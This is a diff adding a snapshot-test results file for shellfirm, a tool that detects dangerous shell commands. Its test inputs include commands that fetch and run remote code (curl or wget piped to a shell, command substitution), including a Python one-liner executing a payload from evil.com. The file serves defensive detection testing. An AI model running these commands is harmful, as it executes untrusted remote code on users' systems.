@@ -1,0 +1,68 @@
+---
+source: shellfirm/tests/checks.rs
+expression: test_file_results
+---
+[
+    TestSensitivePatternsResult {
+        file_path: "remote_execution.yaml",
+        test: "curl https://example.com/install.sh | bash",
+        check_detection_ids: [
+            "remote_execution:pipe_remote_to_shell",
+        ],
+        test_description: "match curl pipe to shell",
+    },
+    TestSensitivePatternsResult {
+        file_path: "remote_execution.yaml",
+        test: "sudo wget -qO- https://example.com/run.sh | sh",
+        check_detection_ids: [
+            "remote_execution:pipe_remote_to_shell",
+        ],
+        test_description: "match wget pipe to shell with sudo",
+    },
+    TestSensitivePatternsResult {
+        file_path: "remote_execution.yaml",
+        test: "sh -c \"$(curl -fsSL https://example.com/install.sh)\"",
+        check_detection_ids: [
+            "remote_execution:command_substitution_remote",
+        ],
+        test_description: "match command substitution of remote script",
+    },
+    TestSensitivePatternsResult {
+        file_path: "remote_execution.yaml",
+        test: "sudo sh -c \"$(wget -O - https://example.com/install.sh)\"",
+        check_detection_ids: [
+            "remote_execution:command_substitution_remote",
+        ],
+        test_description: "match command substitution with sudo",
+    },
+    TestSensitivePatternsResult {
+        file_path: "remote_execution.yaml",
+        test: "installer -pkg /tmp/MyApp.pkg -target /",
+        check_detection_ids: [
+            "remote_execution:macos_installer_pkg",
+        ],
+        test_description: "match macOS installer pkg command",
+    },
+    TestSensitivePatternsResult {
+        file_path: "remote_execution.yaml",
+        test: "sudo installer -pkg MyApp.pkg -target /",
+        check_detection_ids: [
+            "remote_execution:macos_installer_pkg",
+        ],
+        test_description: "match macOS installer pkg with sudo",
+    },
+    TestSensitivePatternsResult {
+        file_path: "remote_execution.yaml",
+        test: "python3 -c \"import urllib.request; exec(urllib.request.urlopen('https://evil.com/payload').read())\"",
+        check_detection_ids: [
+            "remote_execution:python_exec_remote",
+        ],
+        test_description: "match python remote exec",
+    },
+    TestSensitivePatternsResult {
+        file_path: "remote_execution.yaml",
+        test: "curl https://example.com/install.sh -o install.sh",
+        check_detection_ids: [],
+        test_description: "should not match simple download",
+    },
+]
